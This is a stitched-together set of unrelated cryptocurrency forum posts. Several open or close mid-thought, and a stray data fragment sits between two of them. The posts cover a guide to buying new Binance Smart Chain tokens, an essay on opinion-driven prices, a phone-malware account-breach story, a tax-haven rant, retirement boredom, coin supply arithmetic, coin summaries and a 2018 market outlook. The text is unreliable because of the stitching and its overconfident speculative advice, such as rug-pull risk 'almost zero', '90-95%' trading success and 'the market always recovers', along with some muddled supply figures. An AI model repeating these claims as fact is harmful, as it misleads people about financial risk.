What they are and how you can avoid them.'* Since then I got a lot of messages from people asking me how they can tell the difference between a new coin with lots of potential and a shitcoin. For maximum protection, make sure you follow this guide in combination with the other guide. I will not repeat those rules here. If you don't follow the rules of the other guide as well, you will lose your money.Before I start, some background: I trade small coins for a living. In the beginning, while learning, I fell for all the scams just like everyone else. But with every loss I learned something new and I'm now pretty good at it. Yes, I have losses like everyone else, but usually I get out with very small losses compared to my gains.Anyone here hating shitcoins, I agree with you. **I hate shitcoins too.** Part of what I want to explain here however is that not every new coin is a shitcoin. Every coin has to start with 0 holders. Everyone has to start somewhere. And every solid project deserves a chance to grow. Yes, the vast majority of new coins are shitcoins, but I want to help you tell the difference between the real gems and all the shitcoins.# The Golden RulesIf you start looking for the real gems and want to trade smaller coins, **follow these rules or you will lose money**. 1. Start trading on the BSC (Binance) Smart Chain. Why? Transactions cost around $0.20 max. You can't do this on the ETH chain where you spend lots on gas fees, sorry. I know they came down, but they're still too high.2. For the first 1-2 months, don't invest more than $5 per coin. I am not joking. Yes, your gains will not be thousands of dollars, but if you go in with more you will end up losing a lot of money, trust me.3. Have a small bag of maybe $150 or $200. Be prepared to lose your small bag completely. If you can't afford this and sleep well at night, don't do it.**Ready? Let's start:**# Find the CoinsGo to the BscScan website (look up the links yourself, I don't want to link-spam this post). Then, go to 'View BEP-20 Transfers'. If the list looks confusing, don't worry. Look at the rightmost column that says 'Tokens'. You must look for the grey icon besides the coin names. Why? Because that means the coin is new. Established coins already have their icons listed and that means you're usually too late to make high gains. You can refresh that page for new coins every second, you will always find new ones.Open the new coins (with the grey icon) in separate tabs and look at them. So, now you have found a coin, it's time to investigate.# 1. HoldersOn the page you just opened, look at the 'Holders' list. The biggest holders of a coin should always be the liquidity pool which is usually identified as 'PancakeSwap: COIN NAME' and the dead coins wallet, usually identified as '0x000000000000000000000000000000000000dead'. Why is this important? It reduces the possibility of a rugpull to almost zero, especially if the dead coins wallet is over 50%.Also watch out if there are too many whales. For example, 10 wallets each holding 3% of total coins is a huge red flag. Abort immediately. A healthy new coin should also have at least 200-300 holders. If it doesn't, also abort immediately.# 2. Liquidity PoolThe liquidity pool is super important. I usually don't buy any new coin unless the liquidity pool is at least $30k or more. Why? Because scammers and shitcoins rarely provide a liquidity pool of that size. Again, we're greatly reducing our risks here. A locked liquidity pool is also important. Make sure it's locked for a longer period of time. 3 months, 6 months, 1 year or longer are great. You don't want the liquidity pool to unlock tomorrow. You can copy the contract ID and then go to 'PooCoin' (again, look up the links yourself), then enter the contract URL there, hit enter and on the next page on the left side it will show you something like 'COIN/BNB LP BNB Holdings:'. That's where you want at least $30k or more. If it has a few hundred dollars or even only $5k or $7k, abort immediately.# 3. VolumeLook at the 'Transfers' section. If the coin has only 5 holders and no activity, skip it. If you want, bookmark it and come back to check tomorrow. You may have just been too early. If it has only a few transactions every 2-3 hours, also abort immediately. It's not taking off yet. A good number of transactions for a new coin should be about 5-10 per minute.# 4. Website & TwitterMake sure the coin has a website and twitter account. If it doesn't have both of them, abort immediately. If it also has a reddit page, a Telegram channel, a Discord, an Instagram page, a YouTube channel, etc. that's even better.# 5. Coin Name & DesignThe logo of the coin and the design of the graphics and website are very important. If it's not attractive, people will not jump in and it won't take off. If the use stock images that you've seen a hundred times elsewhere, abort immediately. The name is also super important. If it has a catchy name like 'Save The World' it's much more likely to take off than 'Funky Toilet Coin 55'.# 6. Bonus: Doxxed TeamThis one is a HUGE bonus. If the team members publicly identify themselves, for example through YouTube videos or live AMA, it reduces the chance of a scam to almost zero. Why? Because their faces and identities are publicly known and they would almost certainly end up in prison.# That's it!Did the coin you investigated fail in any of the first 5 steps? I cannot stress this enough, but: ABORT IMMEDIATELY. Don't invest in it. You will end up losing your money.Did the coin pass all of the above steps? Great! You ***might*** have found a gem. Do some more research before you jump in and make sure the coin has a real purpose. Remember, things like hodling to get more coins or 'to the moon!' are not real purposes.And now we go back to the golden rules. If you are ready to invest in this coin, **remember to only invest $5 for the first 1-2 months** of doing this. I cannot stress this enough. You are learning and you will make mistakes. Make sure you are okay with losing that money because even if a coin matches all of the above, it can still fail for a variety of reasons. If you stick to this rule, you can still make a good amount of money in these 1-2 months. I easily made $10 to $50 with just $5. Sometimes I got out at $3.50 because a coin didn't take off and re-invested elsewhere.Once you've done the above for 1-2 months and you've noticed any potential mistakes you made, you should be ready to start trading with $10 or $20 per coin (depending on your financial situation).Two more important things to remember:1. Early coins take time to take off. It's very possible that your $5 investment will drop to $3 or $2 in that time and go up to $10 and then go back down to $4. It may just sit there doing nothing for 5-14 days. That's absolutely normal.2. Keep track of what the team is doing during this time. If there are no updates for 2-3 days, sell and get out. A good team should update its holders several times per day through several channels (Twitter, Discord, Telegram, etc). It's okay to get only 1 update per day, but less than that is a red flag.I **always** follow the above rules when trading with small coins and I currently have success with 90-95% of coins that I invest in. Trust me, **I tried to skip some of the rules above and I got burned every time**. Yes, it's a lot of work. Especially if you have to repeat these steps for every single coin you want to investigate, but you will get much faster at it over time. If you end up doing this for a living, you will probably be able to investigate 2-3 coins per minute.Now, if you excuse me, I need a coffee and relax my fingers a bit.

We need to do this or we may not make it, and our grandkids stand no chance.______________________________________________________________________**I also expended the 'now what happens' section, to explain how these pullbacks are a good thing, make crypto more stable, and why we keep seeing larger ceilings after every pullback... this stuff is really important for you to make money on this thing, if that's your goal....**I've made a similar post in a few spots, and this is something that is absolutely critical for people to understand... what impacts price, and what is going on lately. Price has only a very minor correlation with money invested, and a major correlation with opinion. ... and Humans are an emotional bunch.So what drives price of any commodity, crypto, gold, pizzas, whatever? The money invested in it, right? Kind of, but not really. What if I told you that you could theoretically raise bitcoin from $15k to $20k by spending $1, and lower it from $25k to $1k by spending the same $1? Crazy right?**AN EXAMPLE**This is going to start out slow, I want to make sure I get everyone on the same page before I pick things up and lift the curtain. Stick with me here....This is an example to help illustrate why prices aren't driven by money invested, but rather consensus and opinion. Lets imagine the following exists (we will use bitcoin as an example, but this is how everything on the planet works)Lets say Bitcoin is currently priced at $10k (the last sale). From $11k to $99k, every $1k there is someone with a sell order of 1 full bitcoin. From $9k to $1 dollar, every $1k on the way down there is someone with a buy order of 1 full bitcoin.So, right now if you wanted to buy bitcoin you have several options... meet the lowest seller's price of $11k, or, put your own buy order up, above the highest buyer's bid order (overcut them). If you decide to just place an order, the price doesn't change. If you decide the buy the $11k bitcoin, now bitcoins value is $11k, with a new lowest sell offer of $12k, and a highest buy bid of $10k. Someone else comes in an overcuts the buy bid and puts 1 BTC for sale for $11k. No trades are made until someone matches a buy/sell.Okay, that's kindergarten stuff, most people here understand that. So how much money drove the price up in this situation? $11k, and BTC price raised 11/10, 1.10, or 10% from the last sale. Now the entire marketcap of BTC raised 10% (last sale multiplied by circulating supply). So it takes $11k to drive a 10% increase, right? Not at all. Lets look at what happens when news is released.News comes out that Warren Buffet thinks bitcoin is a scam, a bubble, and he wouldn't touch it with a 10 foot pole because he only invests in things he understands and he doesn't understand crypto. People panic everywhere, and believe 'this guy is smart, I'm overvaluing this thing'.Suddenly people don't want to buy this scam anymore, and the buy orders for $11k, $10, and $9k are taken down. At the same time, the people wanting to sell start to panic and just want out. The guy at $32k (who just had that offer up 'just incase it moons') drops down to $11k sell order. The guy at $12k, who was the lowest, now undercuts him to $10k. The other buyers see the sellers undercutting and think that if these people want out, why am I buying in. The $8k guy pulls his offer, and so do the $7k, $6k and $5k guys. The highest offer is now $4k. The sellers panic further and the $14k guy undercuts the $10k guy and puts up a $9k sell. The $15k, 17k and 11k guys all see this flurry of panic and now a storm undercutting is triggered, to $8k, $7k, and $6k. The $8k order pulls his again and goes down to $5k. The price on the buy and sell orders has moved around a ton, but no sales have actually happened yet. Technically, BTC is still 'worth' $11k, and the market cap reflects that. All this horseshit has happened, and it only happened in 10 seconds, but the price hasn't moved yet. The $27k guy wakes up and checks his phone. He had a $27k offer just incase the price moved also, and he also only has a tiny infinitesimal fraction of a BTC. Well, he decides 'he's out' and fills $1 worth of the part of the $4k guys buy offer.The latest price information is now updated, and BTC fell from $11k to $4k price per BTC with the movement of a single dollar.This is exaggerated example, but this is what moves price. Not money in vs money out. The ONLY THING that moves price is perception.**OPINION FLOW AND NOT MONEY FLOW**Now the above example only happens if everyone simultaneously believe the same thing... this the asset they are holding is a steaming turd. What happens in reality is there's no black and white, it's shades of gray. It's flow in vs flow out. But again, not flow MONEY, but rather OPINIONS.If 66% of the holders of something all of a sudden unanimously decide that their asset is overvalued, then they panic sell. Even if 33% of the people decide they are going to buy up as much as these panic sellers sell, if the panic is strong enough, and they are slitting eachother's throat to sell, then the buyers just happily sit and let them do that, and time their buys in. Very little money has to actually change hands in order for this price to crash, all that matters is the FLOW OF OPINION has to be swift and violent, and in majority. The sellers will leapfrog eachother on the way down, faster than the buyers scoop up their sales, and the net result is a crashed price.Note, this happens both ways... fear, uncertainty and doubt (FUD) as well as overhyped FOMO (Fear of missing out). **So now what happens?**Time goes by and all holders opinions of their asset hasn't changed. They still think it's worth $11k and they got great deals scooping up what these sellers were selling. The weak hands have left the market and have been replaced with holders. Overall, now a higher percentage of holders believe in the product they are holding and are unwilling to sell for the panic prices of the last week. Panic sellers were also replaced by new money, people who have wanted in for a while and are now in on their perceived ground floor.Also, people who bought BTC at $1 ten years ago and have been looking for an exit to cash profits have now been replaced by either long term holders, or by these new people who are thrilled to have finally entered, and they are looking to hold long. So what happens on pullbacks? The number of people waiting to jump off the ship has decreased. The new ground floor is established. Are we done? Who knows, this could go on for another year, but what matters is that people who want off are getting off and people that want on are getting on. People who have panic sold and never believed in this in the firstplace... people who have wanted out for 10 years... they have been replaced by people who are now getting in on THEIR GROUND FLOOR, and are going to be holding long. The market is suddenly increasingly more stable today than it was yesterday, even though prices are down. **This is a good thing.** This is why crypto keeps bouncing back from pullbacks and reaches new higher ceilings and floors each time. Old money who wanted out, and new panic holders, they are gone. They are replaced with adopters, holders, believers in this technology. These people aren't selling anytime soon, because they believe that this thing is going to revolutionize the world. Every crash brings more of these people in, and removes more panic sellers out. **Moving forward**Now news releases start coming out about how stock ETFs are being created, NASDAQ index funds, bank support, government support. Companies are using this tech, and companies who use blockchain for transportation are putting non-blockchain companies out of business. The people on the outside looking-in feel they are missing out. They now start coming in and buying. They start overpricing eachother on their buy orders, and eventually it gets close enough to a sell order that someone decides they are just going to meet the sell price. The sale goes through.Sellers (HODLERs) see this action, and they start pulling sell orders off the table almost as fast as they fill. Sure some trades go through, and incoming money is driving the price up as market orders are filled. But what's also happening is people are seeing this flurry of volume, and sellers are pulling sell orders and placing them higher. Junk coins and pump and dump scam coins are dying by the millions. In their ashes, good solid technology projects whose coins have fundamental economic reasons for growth, these are rising. Corporate partnerships continue forming. The real world continues to create actual use cases. Companies start storing more and more corporate information on blockchain. Public companies use blockchain to store scientific research (See Canadian Research Council announcements), and blockchain acts as a Library of Alexandria. People can travel out of country without any monetary exchange, using their chosen cryptocurrency to buy the things they need abroad. The world is slowly actually USING this technology. Money is coming in, but more importantly, OPINION IS CHANGING. Literally nothing could have happened in terms of fundamentals, partnerships, etc... this can all be driven entirely emotional, so long as it's wide-spread and strong. Infact, the market could THEORETICALLY rebound in this way from $4000/BTC to $1 MILLION PER BITCOIN by the sale of ONE PENNY. $4000 sound low? Does that number make you uncomfortable? We may go that low. We may not. If we do, I'm not panicking and selling, I'm buying more.**SO WHAT HAS HAPPENED IN THE LAST FEW MONTHS? and where are we going?**A lot of new money has come in from Nov-Jan, and they don't really know what they are investing in. Sure some of them have done great research and are smart investors but most people aren't and isntead they are buying Symbols and Names and trading on speculation. They are treating their favorite coins like a sports team, and will follow them irrationally off a cliff.These new people came in and invested in cryptocurrency because their OPINION was heavily influenced in Nov, Dec, Jan, from media. They saw this money making machine called crypto. They were willing to pay huge, ride the wave up, keep buying, etc. They were 'ground floor adopters' and were going to get rich.They outnumber the old money by A LOT. Their OPINION MATTERS. It matters the most.To keep this in perspective, they are also a VAST MINORITY of 'new money' that will enter the game in the next decade. This cycle will continue over and over and over. Their opinion rose nearly unbounded and price rose accordingly. Market cap rose from 10B to 750B, and it could have been VERY LITTLE actual money that did this. How much did it need to be though? Literally ONE PENNY, theoretically. All that matters in moving price is MOMENTUM OF OPINION. I believe it has been estimated that as low as 6B USD was responsible for the bull rush.These people then started hearing 'Bubble', 'Scam', Fake news about governments banning. They don't understand how technology wins, always. Crypto is beyond government control. If they could have stopped Bitcoin they would have done it already. **WHO IS DRIVING ALL THIS?**Most investment opportunities go first to 'accredited investors'. You need to have multimillions in order to get in on the ground floor for most stock IPOs, and we're seeing that start to happen with coin ICOs. Bitcoin was a joke for the first few years, while lunatics picked it up. At this point, it was really too late to get in 'early', and who would have wanted to anyways, it was all still a joke. So Wallstreet, banks, governments have generally watched on the sidelines as average Joes who were crazy enough to be early adopters and toss $100 on fake internet money slowly became millionaires. Not only that, but the idea of blockchain started to become understood. The power and value in it became understood. Not only as a way to track 'monetary value' but for many other applications as well. Platforms were created, business uses brainstormed, products started being made. This thing started taking off, and wasn't a joke anymore. But regardless, big money wasn't in on the ground floor. They have stakeholders opinions to think of, and what do they say to investors when they lose all their money on magic internet points?But they have woken up now. This thing has 'popped' many times now and keeps recovering. This thing won't die. could they have been wrong all along? If they want in, how do they get in? They are no dummies, they have been controlling the world their whole lives? Look at the media experiment that Trump is doing? He is testing just how we work... you can do literally anything and we remember it for like 30 seconds, until the next news story comes out. We change opinions very easily. We are swayed very easily. We are their puppets. Media controls the world. They know their way in.They have ONE WEAPON against cryptocurrency.YOUR OPINION OF IT.And they know it.**Media.**That's why FUD is so powerful and needs to be respected. It's why we need to read more than titles on news articles. We need to question what we read, **whether it's good news or bad news**. We need to think about 'what are the motives of the person saying this to me'. Does the government have a conflict of interest when they state that crypto is gambling? Do they have skin in the game? What about wall street? Does WEISS ratings possibly have incentive to come out with poor ratings? Do banks have incentive to lock accounts in order to 'protect' customers from 'unsafe investments' when their entire business model revolves around holding as much of your money as possible and making money off it? Do you think banks have any super secret hidden interest in preventing you from storing your money elsewhere? I'm not sure, maybe you can critically think about that.Just understand that this goes both ways. When crypto is booming and Fox news is showing people how to buy $4 ripple on prime time, you may want to start putting in some stop loss orders. When the suicide hotline is stickied at the top of /r/cryptocurrency and everyone is panic selling, you may want to start picking up some firesale deals. So, the question is this... Is crypto undervalued or overvalued at it's price today? Where is the price going long term? **I'm not talking about it's use case**, I'm talking about in the **court of public opinion**, where is THAT going? Because THAT is what is going to drive price in the future.Without a crystal ball, this is of course impossible to know. Do your own research and form your own opinion. It could very well be that the technology having a use-case will in and of itself drive opinion, and thus price. But make sure you understand that it's not the technology itself, it's not the value of the business itself, it's not the use case itself that will drive price, it is the publics OPINION of that thing which drives price. They are intertwined, but they are NOT the same thing.TLDR: VERY VERY little money has to move around in order to swing prices drastically, up or down. Money in and out doesn't drive price, OPINION does. How do you let the news you read impact your opinion?How are you being played (on both sides, shilling and FUD).Something is only worth what people think it's worth. Often that's based on reality, value, business, money, but often it's entirely emotional.[Structure your portfolio in a balance, intelligent way, using risk methodology.](https://www.investinblockchain.com/cryptocurrency-investment-risk-management/). Invest money you are willing to lose. Support legitimate technology and teams who are actively driving their product to completion, coding, and marketing. Stop trying to make money overnight in pump and dump scams, or pyramid schemes. Every day, take one coin, do a deep dive on it, learn it inside and out. Look into their team and their past. Do that every day for a year, and you just learned 365 coins inside and out. Ask yourself the following key questions:Have those members consistently jumped ship on previous projects? Is that where you want to invest in? Is their team capable of executing on their vision? Are they trying to solve world hunger, and their team is a few 16 year olds in a garage? How active is their github? Are they adding chunks of code regularly, or is a ghost town? Are they marketing their product at all? Or is marketing the only thing they are doing? What are the economics of their coin itself? Is it required to be used to gain access to their technology? Are there burns? How premined is it, and what portion do the founders hold? What about their vision? Are they trying to solve a problem that needs to be solved? What are the economics of that problem and how much money does the solution potentially save clients?These are all questions you should be asking when you give your money to someone else. We're a lot more stable than we were - a correction was bound to happen. Too much early money wanted to cash in profits. These people have been replaced by new money who is holding on their own ground floor. The whole industry in general is still in very early stages. Rest assured that anyone reading this is still very much an early adopter. Just make sure you are investing in actual technology, and supporting capable teams, and not buying air.

Unauthorized login email from pornhub. Checked it, sure enough someone logged in with my password. Don't give two shits about someone watching porn on my account, so I immediately went to work on the rest.I don't share passwords with any accounts, but pornhub one was an oddly secure password that probably couldn't be brute forced... I assumed breach.Changed all my exchange passwords that were tied to the same email, and switched all their 2fa to my phone instead of email. That's when I start getting login failure notices... Of course they hit the exchanges first.After that I damage controlled financial institution accounts, and sure enough started seeing login failures on those. About 15 minutes after I got the pornhub notice (when serious damage would've already been done) I got a 'possible breach' notification from capital one assistant.I totally am usually asleep right now. Pornhub may have just saved me tens of thousands of dollars, and is apparently more reliable than all my financial institutions.****Update and FAQ:Thanks so much for the awards and responses! I just thought this was a funny near miss and wanted to share my maniacal laughter, had no idea it would blow up like this.So, turns out it was my phone that was malware compromised. Factory reset, extended authy to everything for now, all passwords changed, all financial institutions alerted.As has been pointed out a few times in comments, it's likely they accessed pornhub first because if I had linked crypto wallets or bank accounts for tipping, they could just send all meh money to their verified account. Probably a super easy front door way of scooping a couple BTC up from unwitting peoples... Hadn't thought of that, I just assumed they were testing access.No, having a pornhub account doesn't mean I pay for porn, just that I like to save playlists and favorites. Some of you are living in the 90s of internet porn. Amazed at how many people assume that the breach came from pornhub. Frankly, it seems like they guard info better than anyone else I deal with. I would never think of putting personal information into any porn site... Pornhub's app has always proven to be secure and well supported.All credit accounts frozen, all financial institutions contacted. Net loss of ZERO. They attempted a $7000 wire transfer out of my checking account that my small town bank ofc called me about, and a $1300 credit card purchase that got declined as sketch. Otherwise it seems I beat them to all accounts.****EDIT 2:Since so many people are asking about my phone... It's an Android, brand new Motorola sealed in box. No, I don't know the source, just know that it happened in a 2 hour window before I got all my security up and running, during which time I used it for work a lot and downloaded a lot of my standard programs.I just ran my basic security check, and thing came up red af, so I didn't even bother trying to treat...

They are not using cryptocurrency to do that, there are plenty of loopholes in tax laws for doing it legally.The rich are holding properties and investments under a network of offshore companies that are set up in other countries, or 'offshore'.These offshore countries or territories are where:'- it's easy to set up companies'- there are laws that make it difficult to identify owners of companies'- there is low or no corporation tax.The best part of it is that using tax havens to dodge taxes is not illegal. Loopholes in the law allow people to legally avoid paying some taxes by  moving their money or setting up companies in tax havens, but it is  often seen as unethical.Its estimated that from $5.6 trillion to $32 trillion is hidden in tax havens, according to the ICIJ.  The IMF has said the use of tax havens costs governments worldwide up to $600bn in lost taxes each year.To hide money all you need to do set up a shell company in one of the countries or  jurisdictions with high levels of secrecy. This is a company that exists  in name only, with no staff or office.  It costs money though. Specialist firms are paid to set up and run shell  companies on your behalf. These firms can provide an address and names  of paid directors, therefore leaving no trail of who is ultimately  behind the business.When such a huge amount of money is hidden in offshore havens, the rich still blames cryptocurrency as the culprit for money laundering. This is classic gaslighting. They are projecting and blaming the most vulnerable group, what they do themselves.This legal way of tax dodging will never end because the people that could end the secrecy offshore are themselves benefiting from it. So there's no incentive for them to end it.Its time more people speak up against this and move more towards cryptocurrency where all data is independently verifiable.EDIT 1: It was a mistake on my part to say crypto is not used for money laundering. I saw that Bill Gates mentioned cryptocurrency as an innovation that the world can do without because it is sometimes used for criminal activities and with the current pandora papers leak where the ultra rich was dodging taxes using tax havens and trusts and thought , here is a guy doing borderline unethical things to dodge taxes and is bad mouthing a nascent technology because it is used for criminal activities by a small section of people taking advantage of its use cases. He was saying the world doesn't need crypto without seeing it's far reaching positive sides. I thought if a few criminal activities makes him think that crypto should be stopped, why doesn't he say the same thing about the banks, law firms and other institutions that promote, support and enrich from tax dodging.

Set up your own business, study something you love or whatever. Just make sure your brain will keep doing some exercise and that you'll be part of some group/society.Seeing so many posts about when lambo, when moon etc., I see myself a few years ago discovering that I could finally hasten by '~10 years my retirement (I'm in my 60's now). Damn, was I happy about that. I could finally erase all my debt, travel without worrying about days off being discounted of my paycheck, spend lots of time with my family and buy some of the stuff I've always wanted. In '~6 months my life changed really hard, and for the better! I gave my grand kids a nice trip do Disney and paid the wedding of my youngest daughter. Suddenly everything fit perfectly.After 7-8 months, then, I got myself thinking like 'so... is this it?'. I was not happy anymore. Don't get me wrong: I wasn't *unhappy*, but I wasn't happy either. I would wake up everyday, go for a walk, pass by some bakery and buy some stuff, and get back home to surf on the web. I could of course travel to wherever I wanted, but what for? Friends came in asking for money and I never heard from them again. Some relatives thought I'd won the lottery and suddenly became extremely friendly and helpful, even though literally no one but my daughter and her husband were here at my wife's funeral. At the end, I've decided to go back to studying and finally entered college. It changed my way of perceiving the world and now I'm quite happy. I've also volunteered at some NGOs in my city and it helped me to keep my pace with society.So my advice is that you need to get prepared to deal with boredom. We grow up with our parents telling us to go to school, have a job, a car, a house and that this is life. But when you suddenly have the car, the house and everything else, what's left? Do something for yourself and have this in mind. Boredom hits hard and you need to get prepared to deal with it.Godspeed to you all!EDIT: wow, never expected so many reactions to this post!

Let's look at a few popular onesBitcoin is rare like gold, difficult to mine like gold and is used as a store of value like gold. As it becomes more scarce, it will continue to rise in price. It has a total supply of 21 million, of which 18 million are already circulating. After the 21 million are mined, there will be no more available. 18 million x $57k means it has a market cap of over a trillion dollars. That is huge. The total market cap for ALL crypto is 2.38 trillion. Bitcoin is king. Bigger than Visa and MasterCard combined. Bigger than nearly every world bank. It is the world's 3rd largest currency. Ethereum has a total supply of 115 million. More coins than Bitcoin. At the moment, it allows for 18 million to be mined each year max. In July, they are making a change with the London Hardfork, EIP 1559, and every time a transaction is made with ETH, the ETH fees will be burned, making the supply more limited and much more valuable, similar to BTC. Many are saying that ETH will go up to $10k per coin this year because of these changes. When ETH 2.0 is released next year, the price will probably go much higher. With 115 million in circulation, ETH has a market cap of $400 billion. That's worth more than all of Walmart. So, it is really important to check the coin supply and then multiply that by the price you wish it would go to to make you rich. See if the amount seems realistic or not. Let's look at DOGE. Doge has a total supply of 127 billion coins and a max of 10,000 are mined each day [EDIT: DOGE mints 10,000coins every *minute*, not every day!]. That's an additional 5 billion coins each year. If you multiply 127 billion coins the $100 you wish it were per coin, it would have a market cap of $12.7 trillion dollars. There is $37 trillion dollars in the world. Is DOGE worth 1/3 of all the money in the world? The entire economy of the United States is $25.3 trillion. Is it realistic to say a meme coin is worth roughly half the US economythe largest economy in the world?Let's take a look at Stellar Lumens. The max supply is $50 billion. The supply increase is 500 million a year, which alone is 23 times the total amount of BTC each year. Anyway, if it were $1000 per coin, the total market cap would be $50 trillion, more than double the US economy. At the very most, maybe they could be $10 each? I say it could be worth $10 because it has actual utility. I think DOGE would top out at $1, and that would be pretty crazy. If DOGE were worth as much as ETH, which I've seen people on the doge subreddit think might happen, Doge would be worth a modest $388,720,000,000,000. $388 trillion. That's at least 3 times all the money in the world economy, if Google serves me right.Then you have to be really careful of coins that are just a rug pull and get promoted on Tik-Tok, like Safemoon. I don't even need to do the math on Safemoon to know it's a scam. They will get people to throw all their money into it and then they cash out their supply and take everyone's money. The total supply for Safemoon is 1 quadrillion coins!!! Stay away from that. Insanity. Look at supply of successful coins beyond BTC and ETH and see if you think they could be worth a lot more in the future. Here are some I think worth investing in:Polkadot (DOT): Total supply: 935.5 million, total supply 1 billionChainlink (LINK): Total supply: 419 million, max 1 billionCardano (ADA): Total supply: 45 billion. This coin has many great uses, but will not be worth as much as others simply because of the number of circulating coins. Maybe $10-$12 a coin max? But it is under $2 right now. ATOM: Total supply: 248 million. New coins are created each year as rewards for people that hold (stake) ATOM. If you can find a good coin that gives you APR, many are 5-6%much better than a traditional savings account! Algorand (ALGO): 2.96 billion, also releases new coins as rewards to people that hold ALGO. Tezos (XTZ), circulating supply: 756 million. Total supply: 763 million. MANA: this coin is only used for a video game called Decentraland. Atari is making a casino opening in May in that virtual world. Supply available: 1.5 billion. Total supply: 2.6 billion. Polygon (MATIC): 10 billion, half in circulation. Because there is a max supply of 10 billion, if it grew to the size of ETHwhich won't happeneach coin would be worth $35 a coin (Take the market cap of ETH and divide it by the supply of MATIC to see what it would be if it were as huge as ETH). It's under a dollar now. Maybe it could grow to 1/4 of ETH if we're being optimistic? That would put it at $8.75 a coin. Enjin (ENJ) 1 billion coins max, 834 million circulating. The list goes on, I just picked a handful of random coins I hear mentioned a lot, but all you need to do to check out what a realistic expectation for a coin is is to take the current supply of tokens, multiply it by what you wish the coin was worth and compare the market cap to BTC or ETH's market cap, over a trillion and $400 billion, respectively. I don't expect any alt coin to be worth as much as those those two. And, it bears repeating, the entire cryptocurrency market is worth 2.38 trillion. If you calculate that your coin at $100 is going to be worth double, triple, or quadruple that, I'd say that's an impossibility. Likewise, you can do the math the other way to see what your coin would be worth per coin if it were as big as ETH or BTC by simply dividing the market cap for ETH or BTC by the number of coins circulating for your prospective coin. Your coin won't grow as big as those two, but it's a good way to visualize it and manage your expectations. (Note that some of my supply numbers might be off a little, but they should be in the general ballpark)",False,Will DOGE be worth $100 a coin? Can it become as big as ETH? Could Stellar Lumens be worth $1000 a coin? Will Safemoon make me rich??

Obviously in 2 sentences is hard to describe the whole project idea, but I tried my best.&#x200B;1. **Bitcoin (BTC):** the original. According to the creator (or creators?) Satoshi Nakamoto, it was created to allow online payments to be sent directly from one party to another without going through a financial institution.2. **Ethereum (ETH):** Ethereum is the wonder child of crypto, acts as an infrastructure for most decentralized applications. Introduces smart contracts, which are like programs with specific procedures that, once deployed, no one can change.3. **Tether (USDT):** a centralized stablecoin tied to the dollar (so Elon, please don't try to pump it)4. **Polkadot (DOT):** open-source protocol aimed at connecting all different blockchains and allowing them to work together, allowing transfers of any data.5. **Cardano (ADA):** Another blockchain, trying to improve scalability, interoperability and sustainability of cryptocurrencies.

It was the first-mover and without him many other projects wouldn't be around today.32. **IOTA (MIOTA):** open-source decentralized cryptocurrency engineered for the Internet of Things, with zero transaction fees and high scalability since it uses a blockless blockchain where users and verifiers of transactions are the same (it may sound wrong but it's actually a genius concept, impossible to sum up in a single sentence).33. **Neo (NEO):** Blockchain application platform and cryptocurrency for digitized identities and assets, aiming to create a smart economy. It was one of the coins that suffered most after the 2018 bull run.34. **Solana (SOL):** another blockchain aimed at providing super-high-speed transactions.

The CEL token grants you some benefits such as increased payouts.46. **Algorand (ALGO):** Algorand is a blockchain network aiming to improve scalability and security. ALGO is the native cryptocurrency of the network, used for a borderless economy and to secure stability in the blockchain.47. **Dash (DASH):** It is a fork of Litecoin launched in 2014, focused on improving the transaction times of the blockchain and become a cheap, decentralized payments network.48. **Decred (DCR):** it is a blockchain-based cryptocurrency aimed at facilitating open governance and community interaction. It achieves this by avoiding monopoly over voting status in the project itself, giving to all DCR holders the same amount of decision-making power.49. **The Graph (GRT):** Trying to become the decentralized Google, it is an indexing protocol for querying networks like Ethereum. It allows everyone to publish open APIs that applications can query to retrieve blockchain data.50. **yearn.finance (YFI):** part of the DeFi ecosystem, it is an aggregator that tries to simplify the DeFi space for investors, automatic the process of maximizing the profits from yield farming.&#x200B;'*EDIT:A couple of coin descriptions were just jokes, here are the actual explanations:* **Bitcoin SV (BSV):** It is a fork of Bitcoin Cash (which is also a fork of Bitcoin). Once again, the reason behind this is to 'stay true to Satoshi vision', trying to improve scalability and stability.* **Monero (XMR):** Monero's goal is simple: to allow transactions to take place privately and with anonymity. Even though it's commonly thought that BTC can conceal a person's identity, it's often easy to trace payments back to their original source because blockchains are transparent. On the other hand, XMR is designed to obscure senders and recipients alike through the use of advanced cryptography.

This year its been much more severe though for several additional factors that have compounded on top.Different theories exist on why this happens (its actually the mirror opposite of the 'January Effect' that happens in the US stock market), but the two major theories are:1) Asian markets pull into fiat because of Asian New Year spending needs2) People in the US sell in January to defer their capital gains tax liability an extra yearWhile this cyclic event has lead to a healthy correction in the last few years, this year we got these new factors making more fear as well:* [Yet more scary news on China cracking down on crypto exchanges](http://www.coindesk.com/pboc-official-calls-for-wider-ban-on-chinese-crypto-trading-report/)* [Korea regulatory uncertainty](http://www.bloomberg.com/news/articles/2018-01-16/cryptocurrencies-resume-slide-as-bitcoin-tumbles-to-december-low)* [European governments talking about regulations](http://news.yahoo.com/rule-bitcoin-must-global-germanys-central-bank-says-154144224--business.html)* [BTC futures contracts are now expiring this week](http://www.cmegroup.com/trading/equity-index/us-index/bitcoin_quotes_settlements_futures.html), and possible manipulation there with contract hedging pushing the price down* Bitconnect Ponzi finally collapses* We had a new breed of speculators come in during the November/December timeframe after media made cryptocurrency mainstream following the Bitcoin 10K landmark. While cryptocurrency markets have always had too much hype, the latest rise wasn't just over-enthusiasm in fundamentally sound cryptocurrencies like Monero and Ethereum, but mass inflows of fiat into vaporware and complete nonsense without any use case. Many people came in to essentially gamble on symbols on an exchange, and are thus short term oriented and quick to sell on any slight downturn, which such further adds to selling pressure.So in essence we got a storm of scary news along with the usual cyclic downturn. Currently I don't see this as being a systematic crash like Mt.Gox was that would lead to a long term bear market because the fundamental ecosystem is still intact, and I suspect that after about a month we should consolidate around a new low. All the exchanges are still operational and liquid, and there is no breakdown in trust nor uncertainty whether you'll be able to cash out. What range the market trades in will all depend how Bitcoin does, right now we've already broken below 10K but I'm seeing a lot of support at around $8000, which is [roughly where the long term MA curve settles](https://i.imgur.com/kKVsoUt.png). We don't know how bad it will get or what the future will bring, but as of right now we shouldn't be in a bear market yet.**What should you do if you recently entered the market?**If you did buy in the last few months at or near ATH, the very worst thing you can do now is sell in panic and lose your principal. You shouldn't have more money in crypto than you can afford to lose, so it shouldn't be a problem to wait. You have to realize that 30% corrections in crypto are relatively common, just last fall we had a 40% flash correction over more China fears. Unless there is a systematic breakdown like we had during Mt.Gox, the market always recovers. The other worst thing you can do is unload into Tether as your safety net. If there is one thing that could actually cause a long term destruction of trust within the cryptocurrency investment ecosystem, its Tether having a run up on their liabilities and not having enough reserve to cover the leverage. It would not only bring down exchanges but lead to years of litigation and endless media headlines that will scare off everybody from putting fiat in. 